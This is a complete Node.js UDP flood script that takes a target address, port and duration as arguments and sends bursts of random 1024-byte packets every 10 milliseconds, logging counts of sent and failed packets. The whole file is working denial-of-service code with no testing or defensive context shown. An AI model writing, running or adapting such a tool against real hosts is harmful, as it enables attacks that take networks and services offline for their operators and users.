const fs = require('fs');
const dgram = require('dgram');

if (process.argv.length < 5) process.exit(1);
const target = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]);
const stop = Date.now() + time * 1000;
let sent = 0, fail = 0, running = true;

function udpFlood() {
    if (!running || Date.now() > stop) {
        console.log(`[INFO] UDP-FLOOD finished. Sent: ${sent} | Fail: ${fail}`);
        process.exit(0);
    }
    const client = dgram.createSocket('udp4');
    for (let i = 0; i < 100; i++) {
        const msg = Buffer.alloc(1024, Math.floor(Math.random() * 256));
        client.send(msg, 0, msg.length, port, target, err => {
            if (err) fail++;
            else sent++;
        });
    }
    client.close();
}

process.on('SIGINT', () => {
    running = false;
    console.log('\n[INFO] UDP-FLOOD interrupted by user (Ctrl+C).');
});

setInterval(udpFlood, 10);
